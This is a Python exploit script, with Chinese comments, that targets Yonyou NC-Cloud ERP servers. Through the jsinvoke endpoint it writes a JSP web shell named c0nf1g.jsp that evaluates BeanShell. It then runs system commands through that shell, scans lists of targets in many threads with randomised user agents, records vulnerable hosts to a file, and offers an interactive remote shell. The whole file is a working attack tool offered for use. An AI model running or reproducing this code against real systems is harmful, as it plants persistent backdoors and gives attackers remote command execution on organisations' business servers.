import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re

#app="用友-NC-Cloud"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}



def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")


#exp
def upload(url):
	cmd_url = url + '/c0nf1g.jsp?error=bsh.Interpreter'
	cmd_data = '''cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())'''
	try:
		res2 = requests.post(cmd_url,headers=headers,data=cmd_data,timeout=10,verify=False)
		if res2.status_code == 200:
			rsp_cmd = re.findall(r"<string>(.*?)</string>", res2.text, flags=re.DOTALL)[0]
			print("\033[32m[+]{} is vulnerable. {}\033[0m".format(cmd_url,rsp_cmd))
			return 1
		else:
			print("\033[31m[-]{} file does not exist\033[0m".format(cmd_url))
	except Exception as e:
		print ("[!]{} is timeout\033[0m".format(cmd_url))

#upload
def check_vuln(url):
	#清洗url
	url = parse.urlparse(url)
	url2 = url1 = url.scheme + '://' + url.netloc
	url1 = url.scheme + '://' + url.netloc + '/uapjs/jsinvoke/?action=invoke'
	global headers
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/x-www-form-urlencoded',
	}	
	upload_data ='''{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/c0nf1g.jsp"]}'''
	res1 = requests.post(url1,headers=headers,data=upload_data,timeout=10,verify=False)
	if upload(url2) == 1:
		wirte_targets(url2,"vuln.txt")
		return 1
		

#cmdshell
def cmdshell(url):
	#先执行poc
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/c0nf1g.jsp?error=bsh.Interpreter'
		
		#死循环模拟交互式shell
		while 1:
			cmd = input("\033[35mshell: \033[0m")
			#如果输入exit就退出shell
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {'User-Agent': get_ua(),
				'Content-Type': 'application/x-www-form-urlencoded',
				}
				cmd_data = 'cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("{}").getInputStream())'.format(cmd)
				try:
					res = requests.post(url1,data=cmd_data,headers=headers,timeout=10,verify=False,proxies=proxies)
					#poc部分给的有解释
					rsp_cmd = re.findall(r"<string>(.*?)</string>", res.text, flags=re.DOTALL)[0]
					if len(rsp_cmd) != 0:
						print("\033[32m{}\033[0m".format(rsp_cmd))
					else:
						print("\033[31m[-]{} request flase!\033[0m".format(url1))

				except Exception as e:
					print("\033[31m[-]{} is timeout!\033[0m".format(url1))

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':

	print("\n用友-NC-Cloud upload rce scan by when\n")

	arg=ArgumentParser(description='check_url By when')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python3 NC_Cloud_upload_rce.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:python3 NC_Cloud_upload_rce.py -furl.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:python3 NC_Cloud_upload_rce.py -c http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
		end=time()
		print('任务完成，用时{}'.format(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)

